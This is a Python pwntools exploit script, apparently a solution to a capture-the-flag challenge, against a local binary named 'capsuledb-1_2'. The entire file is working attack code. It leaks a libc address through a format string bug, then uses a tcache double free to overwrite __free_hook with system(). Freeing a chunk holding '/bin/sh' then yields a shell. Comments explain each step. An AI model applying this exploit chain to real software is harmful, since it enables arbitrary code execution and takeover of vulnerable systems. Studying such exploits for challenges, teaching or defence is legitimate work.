from pwn import *

elf = context.binary = ELF("./capsuledb-1_2", checksec=False)

proc = process()

#gdb.attach(proc,"""continue
#""")

indexcount = 0
def malloc(size,data):
    #sleep(0.1)
    #proc.recvuntil(b"> ")
    proc.sendline(b"1")
    sleep(0.1)
    #proc.recvuntil(b"]: ")
    proc.sendline(b"2")
    sleep(0.1)
    #proc.recvuntil(b"Size: ")
    proc.sendline(f"{size}".encode())
    sleep(0.1)
    #proc.recvuntil(b"Data:")
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(10)
    global indexcount
    indexcount = indexcount+1
    return indexcount-1

def free(index):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"3")
    sleep(0.1)
    #proc.recvuntil(b"Index?: ")
    proc.sendline(f"{index}".encode())
    sleep(0.1)

def edit(index,data):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Index: ")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    #proc.recvuntil(b"]: ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Data:")
    sleep(0.1)
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(2)


def view_data(index):
    sleep(0.1)
    proc.sendline(b"4")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    sleep(0.1)
    proc.sendline(b"2")
    proc.recvuntil(b" *********")
    proc.recvline()
    data=proc.recvline().strip(b"\n")
    return data

def double_free():
    libc = context.binary = ELF("./libc.so.6", checksec=False)
    leak_chunk=malloc(60,b"A")
    edit(leak_chunk,b"%10$p") # Libc leak using format string vulnerability, offset 10 leaks a libc address
    libc_leak = view_data(leak_chunk)

    libc_base = int(libc_leak,16) - 0x3ab2a0 # Libc base address from leak
    libc.address = libc_base

    print(hex(libc_base)) # Libc base

    one_gadget = libc_base + 0x41596
    fake_chunk = malloc(60,b"/bin/sh\x00") # Create a chunk that holds string "/bin/sh", later to be used in system() function

    chunk1=malloc(60,b"A") # Create Chunk1
    chunk2=malloc(60,b"A") # Create Chunk2

    free(chunk1) # Free Chunk1
    free(chunk2) # Then Free Chunk2
    free(chunk1) # Then Free Chunk1 

    chunk3=malloc(60,p64(libc.sym.__free_hook)) # use chunk1 to write free_hook pointer to freed Chunk1 userdata



    chunk4 = malloc(60,b"A") # use chunk 2

    chunk5 = malloc(60,b"A") # use chunk1 again to place free_hook to TCACHEbin as it was linked with freed chunk1
    system = libc_base + 0x41710 #- 0x2b2f0
    puts = libc_base + 0x6dba0
    printf = libc_base + 0x54990

    chunk6 = malloc(60,p64(system)) # Arbitrary Write Primitive to write system() function's address to free_hook

    #view_data(fake_chunk)
    free(fake_chunk) # Calling free will call system() and the pointer to /bin/sh string will be passed as first argument gives us RCE

double_free()




sleep(0.1)
proc.recvuntil(b"8/16\n")
proc.interactive()
